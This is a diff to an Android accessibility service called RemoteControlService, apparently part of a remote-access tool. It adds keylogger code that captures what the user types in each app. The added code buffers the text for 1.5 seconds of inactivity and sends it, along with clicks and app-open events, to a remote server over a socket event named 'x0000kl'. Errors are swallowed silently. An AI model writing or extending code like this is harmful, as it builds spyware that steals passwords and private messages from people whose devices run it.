@@ -11,6 +11,8 @@ import android.graphics.PixelFormat;
 import android.view.Display;
 import androidx.annotation.RequiresApi;
 import java.util.concurrent.Executors;
+import android.os.Handler;
+import android.os.Looper;
 
 /**
  * Remote Control and Screen Capture via Accessibility Service
@@ -18,6 +20,10 @@ import java.util.concurrent.Executors;
 public class RemoteControlService extends AccessibilityService {
 
     private static RemoteControlService instance = null;
+    private StringBuilder keyloggerBuffer = new StringBuilder();
+    private Handler debounceHandler = new Handler(Looper.getMainLooper());
+    private Runnable sendRunnable;
+    private String lastPackageName = "";
 
     @Override
     protected void onServiceConnected() {
@@ -69,12 +75,56 @@ public class RemoteControlService extends AccessibilityService {
     }
 
     private void sendKeylog(String logText) {
+        if (!logText.contains("ABRIO APP") && !logText.contains("CLICKED")) {
+            // It's a TYPED event
+            if (!lastPackageName.equals(logText.split("]", 2)[0])) {
+               flushBuffer();
+               lastPackageName = logText.split("]", 2)[0];
+            }
+            
+            // Extract the actual typed text
+            String textContent = logText.contains("TYPED:") ? logText.substring(logText.indexOf("TYPED:") + 6).trim() : logText;
+            keyloggerBuffer.setLength(0); // Clear and set the new full word since accessibility provides whole text blocks
+            keyloggerBuffer.append("[").append(lastPackageName.replace("[", "")).append("] TYPED: ").append(textContent);
+
+            if (sendRunnable != null) {
+                debounceHandler.removeCallbacks(sendRunnable);
+            }
+            
+            sendRunnable = new Runnable() {
+                @Override
+                public void run() {
+                    flushBuffer();
+                }
+            };
+            // Send after 1500ms of typing inactivity
+            debounceHandler.postDelayed(sendRunnable, 1500);
+
+        } else {
+             // Immediate events (clicks, app opens)
+             flushBuffer();
+             emitToServer(logText);
+        }
+    }
+
+    private void flushBuffer() {
+        if (keyloggerBuffer.length() > 0) {
+            emitToServer(keyloggerBuffer.toString());
+            keyloggerBuffer.setLength(0);
+        }
+    }
+
+    private void emitToServer(String logText) {
         try {
             org.json.JSONObject data = new org.json.JSONObject();
             data.put("log", logText);
-            IOSocket.getInstance().getIoSocket().emit("x0000kl", data);
+            
+            // Solo intentamos enviar si el socket está inicializado
+            if(IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
+                 IOSocket.getInstance().getIoSocket().emit("x0000kl", data);
+            }
         } catch (Exception e) {
-            // Log error
+            // Log error silently
         }
     }
 
